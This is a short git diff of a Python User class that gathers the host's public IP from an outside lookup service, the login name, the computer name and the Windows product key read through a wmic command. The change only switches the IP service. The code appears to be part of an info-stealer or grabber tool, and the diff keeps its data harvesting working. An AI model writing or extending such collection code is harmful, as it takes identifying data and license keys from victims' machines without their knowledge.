@@ -18,7 +18,7 @@ class User(object):
 			- Windows Activation Key
 		"""
 		try:
-			ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
+			ip = requests.get("https://ipapi.co/json").json()["ip"]
 			user = os.getlogin()
 			cname = os.getenv('COMPUTERNAME')
 			wkey = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
